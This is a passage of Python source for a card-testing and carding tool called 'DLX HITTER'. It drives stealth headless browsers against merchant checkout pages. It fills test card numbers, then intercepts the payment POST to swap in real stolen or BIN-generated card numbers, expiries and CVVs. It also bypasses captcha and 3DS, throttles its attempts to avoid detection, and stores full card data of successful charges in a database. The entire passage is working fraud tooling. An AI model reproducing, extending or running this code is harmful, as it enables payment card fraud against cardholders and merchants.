        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= ECWID AUTOFILL =============
class EcwidAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    
    EXPIRY_SELECTORS = [
        '#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]'
    ]
    
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]'
    ]
    
    NAME_SELECTORS = [
        '#cardholderName', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '#pay-button',
        'button:has-text("Pay")', 'button:has-text("Place order")'
    ]
    
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    
    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("ecwid.com" in request.url or "ecwid" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        
        await self.page.route("**/*", intercept_route)
    
    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except:
                continue
        return False
    
    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
    
    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

# ============= HITTER ENGINE =============
class HitterEngine:
    def __init__(self):
        self.results = []
        self.successes = 0
        self.fails = 0
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT)
        self.rate_limiter = SmartRateLimiter()
    
    async def hit(self, url: str, card: Dict, merchant: str, product: str, amount: str, attempt_num: int) -> Dict:
        async with self.semaphore:
            return await self._single_hit(url, card, merchant, product, amount, attempt_num)
    
    async def _single_hit(self, url: str, card: Dict, merchant: str, product: str, amount: str, attempt_num: int) -> Dict:
        start_time = time.time()
        result = {
            'attempt': attempt_num,
            'card': card,
            'success': False,
            'decline_code': None,
            'receipt_url': None,
            'response_time': 0
        }
        
        try:
            async with async_playwright() as p:
                fingerprint = FingerprintGenerator.generate()
                
                browser = await p.chromium.launch(
                    headless=True,
                    args=['--disable-blink-features=AutomationControlled', '--no-sandbox']
                )
                
                context_options = {
                    'user_agent': fingerprint['user_agent'],
                    'viewport': fingerprint['viewport'],
                    'locale': fingerprint['locale'],
                    'timezone_id': fingerprint['timezone_id'],
                    'ignore_https_errors': True
                }
                
                browser_context = await browser.new_context(**context_options)
                page = await browser_context.new_page()
                
                await page.add_init_script(FingerprintGenerator.get_stealth_script())
                await page.goto(url, timeout=60000, wait_until='domcontentloaded')
                await asyncio.sleep(3)
                
                provider = detect_provider(url, await page.content())
                
                # Map provider to autofill class
                autofill_map = {
                    'stripe': StripeAutofill,
                    'checkoutcom': CheckoutComAutofill,
                    'shopify': ShopifyAutofill,
                    'paypal': PayPalAutofill,
                    'braintree': BraintreeAutofill,
                    'adyen': AdyenAutofill,
                    'square': SquareAutofill,
                    'mollie': MollieAutofill,
                    'klarna': KlarnaAutofill,
                    'authorizenet': AuthorizeNetAutofill,
                    'woocommerce': WooCommerceAutofill,
                    'bigcommerce': BigCommerceAutofill,
                    'wix': WixAutofill,
                    'ecwid': EcwidAutofill
                }
                
                autofill_class = autofill_map.get(provider)
                if not autofill_class:
                    result['error'] = f'Unsupported provider: {provider}'
                    await browser.close()
                    return result
                
                autofill = autofill_class(page)
                await autofill.handle_captcha()
                await autofill.enable_card_replace(card)
                await autofill.fill_card(card)
                
                submitted = await autofill.submit()
                if not submitted:
                    result['error'] = 'Submit button not found'
                    await browser.close()
                    return result
                
                await asyncio.sleep(5)
                
                if await autofill.wait_for_3ds(10000):
                    await autofill.auto_complete_3ds()
                    await asyncio.sleep(5)
                
                await autofill.handle_captcha()
                
                current_url = page.url
                result['response_time'] = time.time() - start_time
                
                if any(k in current_url.lower() for k in ['receipt', 'thank_you', 'success', 'order_confirmation', 'complete']):
                    result['success'] = True
                    result['receipt_url'] = current_url
                    self.successes += 1
                else:
                    error_text = await page.text_content('body')
                    if 'declined' in error_text.lower():
                        result['decline_code'] = 'card_declined'
                    else:
                        result['decline_code'] = 'unknown'
                    self.fails += 1
                
                await browser.close()
                
        except Exception as e:
            result['error'] = str(e)
            result['decline_code'] = 'exception'
        
        self.results.append(result)
        return result

# ============= TERMINAL UI =============
def print_url_info(info: Dict):
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{'📋 URL ANALYSIS RESULTS'.center(70)}{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.YELLOW}🔗 Checkout URL:{Colors.END} {info['url'][:80]}...")
    print(f"{Colors.YELLOW}🏢 Merchant:{Colors.END} {Colors.GREEN}{info['merchant']}{Colors.END}")
    if info['product'] != 'Unknown':
        print(f"{Colors.YELLOW}📦 Product:{Colors.END} {Colors.CYAN}{info['product']}{Colors.END}")
    if info['product_url']:
        print(f"{Colors.YELLOW}🔗 Product URL:{Colors.END} {Colors.BLUE}{info['product_url']}{Colors.END}")
    if info['amount']:
        print(f"{Colors.YELLOW}💰 Amount:{Colors.END} {Colors.GREEN}{info['amount']} {info.get('currency', 'USD')}{Colors.END}")
    else:
        print(f"{Colors.YELLOW}💰 Amount:{Colors.END} {Colors.RED}Could not determine (JS loaded){Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")

def print_header():
    print(f"\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{'DLX HITTER - Active Session'.center(70)}{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")

def print_progress(current: int, total: int, successes: int, fails: int):
    percent = (current / total) * 100
    bar_length = 40
    filled = int(bar_length * current / total)
    bar = '█' * filled + '░' * (bar_length - filled)
    print(f"\r{Colors.YELLOW}[{bar}]{Colors.END} {percent:.1f}% "
          f"{Colors.GREEN}✓{successes}{Colors.END}/{Colors.RED}✗{fails}{Colors.END} "
          f"({current}/{total})", end='', flush=True)

def print_success(card: Dict, merchant: str, product: str, amount: str, receipt_url: str, response_time: float):
    print(f"\n\n{Colors.GREEN}{'='*70}{Colors.END}")
    print(f"{Colors.GREEN}{'🎉' * 10} SUCCESSFUL CHARGE! {'🎉' * 10}{Colors.END}")
    print(f"{Colors.GREEN}{'='*70}{Colors.END}")
    print(f"{Colors.CYAN}💳 Card:{Colors.END} {card['card']}|{card['month']}|{card['year']}|{card['cvv']}")
    print(f"{Colors.CYAN}🏢 Merchant:{Colors.END} {merchant}")
    if product != 'Unknown':
        print(f"{Colors.CYAN}📦 Product:{Colors.END} {product}")
    if amount:
        print(f"{Colors.CYAN}💰 Amount:{Colors.END} {amount}")
    print(f"{Colors.CYAN}⏱️ Response:{Colors.END} {response_time:.2f}s")
    print(f"{Colors.CYAN}🔗 Receipt URL (Successful Transaction):{Colors.END} {Colors.GREEN}{receipt_url}{Colors.END}")
    print(f"{Colors.GREEN}{'='*70}{Colors.END}\n")

def print_decline(card: Dict, decline_code: str, response_time: float, attempt: int):
    print(f"\n{Colors.RED}[✗] ATTEMPT #{attempt} DECLINED{Colors.END}")
    print(f"    {Colors.YELLOW}💳 Card:{Colors.END} {card['card']}|{card['month']}|{card['year']}|{card['cvv']}")
    print(f"    {Colors.YELLOW}📉 Reason:{Colors.END} {decline_code}")
    print(f"    {Colors.YELLOW}⏱️ Time:{Colors.END} {response_time:.2f}s")

def print_final_stats(successes: int, fails: int, total_time: float, url_info: Dict):
    total = successes + fails
    success_rate = (successes / total * 100) if total > 0 else 0
    
    print(f"\n\n{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{'🎯 FINAL STATISTICS 🎯'.center(70)}{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.YELLOW}🏢 Merchant:{Colors.END} {url_info['merchant']}")
    if url_info['product'] != 'Unknown':
        print(f"{Colors.YELLOW}📦 Product:{Colors.END} {url_info['product']}")
    if url_info['amount']:
        print(f"{Colors.YELLOW}💰 Amount:{Colors.END} {url_info['amount']} {url_info.get('currency', 'USD')}")
    print(f"{Colors.CYAN}{'-'*70}{Colors.END}")
    print(f"{Colors.GREEN}✓ Successful:{Colors.END} {successes}")
    print(f"{Colors.RED}✗ Failed:{Colors.END} {fails}")
    print(f"{Colors.YELLOW}📊 Success Rate:{Colors.END} {success_rate:.1f}%")
    print(f"{Colors.YELLOW}⏱️ Total Time:{Colors.END} {total_time:.2f}s")
    if total > 0:
        print(f"{Colors.YELLOW}⚡ Avg Time:{Colors.END} {total_time/total:.2f}s")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}\n")

# ============= MAIN APPLICATION =============
class DLXHitter:
    def __init__(self):
        self.url = None
        self.url_info = None
        self.cards = []
        self.pattern_learner = CardPatternLearner()
        self.engine = HitterEngine()
        self.rate_limiter = SmartRateLimiter()
    
    def get_url_and_analyze(self):
        print(f"\n{Colors.CYAN}{'─'*50}{Colors.END}")
        print(f"{Colors.BOLD}{'📌 STEP 1: ENTER CHECKOUT URL'.center(50)}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*50}{Colors.END}")
        self.url = input(f"{Colors.WHITE}🔗 URL: {Colors.END}").strip()
        
        print(f"\n{Colors.YELLOW}[!] Analyzing URL...{Colors.END}")
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            resp = requests.get(self.url, timeout=15, verify=False, headers=headers, allow_redirects=True)
            if resp.status_code == 200:
                html = resp.text
                merchant = URLAnalyzer.extract_merchant(html)
                product = URLAnalyzer.extract_product_name(html)
                amount = URLAnalyzer.extract_amount(html)
                if merchant != 'Unknown' and product not in [None, 'Stripe Checkout', 'Checkout', 'Shopify Checkout']:
                    self.url_info = {
                        'url': self.url,
                        'merchant': merchant,
                        'product': product or 'Unknown',
                        'product_url': URLAnalyzer.extract_product_url(html),
                        'amount': amount,
                        'currency': URLAnalyzer.extract_currency(html),
                        'success': True
                    }
                    print_url_info(self.url_info)
                    return
        except Exception as e:
            pass
        
        print(f"{Colors.YELLOW}[!] Static analysis incomplete.{Colors.END}")
        print(f"{Colors.YELLOW}[?] Perform deep analysis with Playwright? (y/n): {Colors.END}", end='')
        choice = input().strip().lower()
        if choice == 'y':
            print(f"{Colors.CYAN}[!] Performing deep analysis (this may take a few seconds)...{Colors.END}")
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            self.url_info = loop.run_until_complete(URLAnalyzer.deep_analyze_with_playwright(self.url))
            loop.close()
            if self.url_info['success']:
                self.url_info['url'] = self.url
                print_url_info(self.url_info)
            else:
                print(f"{Colors.RED}[!] Deep analysis failed: {self.url_info.get('error', 'Unknown')}{Colors.END}")
                self.url_info = {'url': self.url, 'merchant': 'Unknown', 'product': 'Unknown', 'amount': None, 'success': False}
        else:
            self.url_info = {'url': self.url, 'merchant': 'Unknown', 'product': 'Unknown', 'amount': None, 'success': False}
            print(f"{Colors.YELLOW}[!] Continuing with limited information.{Colors.END}")
    
    def get_cards_or_bins(self):
        print(f"\n{Colors.CYAN}{'─'*50}{Colors.END}")
        print(f"{Colors.BOLD}{'📌 STEP 2: SELECT CARD SOURCE'.center(50)}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*50}{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Generate cards from BIN")
        print(f"{Colors.GREEN}[2]{Colors.END} Load existing cards")
        
        choice = input(f"{Colors.WHITE}Choice (1/2): {Colors.END}").strip()
        
        if choice == '1':
            print(f"\n{Colors.YELLOW}[!] BIN format: 424242 or 424242|12|26|123{Colors.END}")
            bin_input = input(f"{Colors.WHITE}🔢 BIN: {Colors.END}").strip()
            
            print(f"{Colors.WHITE}🎴 How many cards? (1-{MAX_ATTEMPTS}): {Colors.END}")
            count = min(int(input().strip()), MAX_ATTEMPTS)
            
            self.cards = CardGenerator.generate_cards(bin_input, count)
            print(f"{Colors.GREEN}[✓] {len(self.cards)} cards generated{Colors.END}")
        else:
            print(f"\n{Colors.YELLOW}[!] Enter cards (cc|mm|yy|cvv) one per line, empty line to finish{Colors.END}")
            while True:
                line = input(f"{Colors.WHITE}💳 Card {len(self.cards)+1}: {Colors.END}").strip()
                if not line:
                    break
                parts = line.split('|')
                if len(parts) == 4:
                    self.cards.append({
                        'card': parts[0],
                        'month': parts[1].zfill(2),
                        'year': parts[2].zfill(2),
                        'cvv': parts[3]
                    })
                else:
                    print(f"{Colors.RED}[!] Invalid format! Use: 4242424242424242|12|26|123{Colors.END}")
            print(f"{Colors.GREEN}[✓] {len(self.cards)} cards loaded{Colors.END}")
    
    def run(self):
        print_banner()
        init_db()
        
        self.get_url_and_analyze()
        self.get_cards_or_bins()
        
        if not self.cards:
            print(f"{Colors.RED}[!] No cards loaded! Exiting...{Colors.END}")
            return
        
        suggested = self.pattern_learner.suggest_best_pattern(self.url_info['merchant'])
        if suggested:
            print(f"\n{Colors.CYAN}[🧠 AI SUGGESTION]{Colors.END} Best BIN: {Colors.GREEN}{suggested}{Colors.END}")
        
        print_header()
        start_time = time.time()
        
        async def run_hits():
            for i, card in enumerate(self.cards[:MAX_ATTEMPTS]):
                if i > 0:
                    last_result = 'declined'
                    if self.engine.results and self.engine.results[-1].get('success'):
                        last_result = 'success'
                    delay = self.rate_limiter.calculate_delay(last_result)
                    await asyncio.sleep(delay)
                
                result = await self.engine.hit(
                    self.url, card,
                    self.url_info['merchant'],
                    self.url_info.get('product', 'Unknown'),
                    self.url_info.get('amount', 'Unknown'),
                    i+1
                )
                
                if result.get('success'):
                    print_success(result['card'], self.url_info['merchant'],
                                self.url_info.get('product', 'Unknown'),
                                self.url_info.get('amount', 'Unknown'),
                                result.get('receipt_url', 'N/A'),
                                result['response_time'])
                    self.pattern_learner.learn(result['card'], self.url_info['merchant'], True)
                else:
                    print_decline(result['card'], result.get('decline_code', 'error'),
                                result['response_time'], result['attempt'])
                    self.pattern_learner.learn(result['card'], self.url_info['merchant'], False)
                
                print_progress(i+1, min(len(self.cards), MAX_ATTEMPTS),
                             self.engine.successes, self.engine.fails)
        
        asyncio.run(run_hits())
        
        total_time = time.time() - start_time
        print_final_stats(self.engine.successes, self.engine.fails, total_time, self.url_info)
        
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        for result in self.engine.results:
            c.execute("""INSERT INTO hits (timestamp, card, merchant, product, amount, success, decline_code, receipt_url, response_time) 
                        VALUES (?,?,?,?,?,?,?,?,?)""",
                      (datetime.now().isoformat(),
                       f"{result['card']['card']}|{result['card']['month']}|{result['card']['year']}|{result['card']['cvv']}",
                       self.url_info['merchant'],
                       self.url_info.get('product', 'Unknown'),
                       self.url_info.get('amount', 'Unknown'),
                       1 if result.get('success') else 0,
                       result.get('decline_code', ''),
                       result.get('receipt_url', ''),
                       result.get('response_time', 0)))
        conn.commit()
        conn.close()
        
        print(f"{Colors.GREEN}[✓] Results saved to database{Colors.END}")

def main():
    try:
        app = DLXHitter()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Process interrupted by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()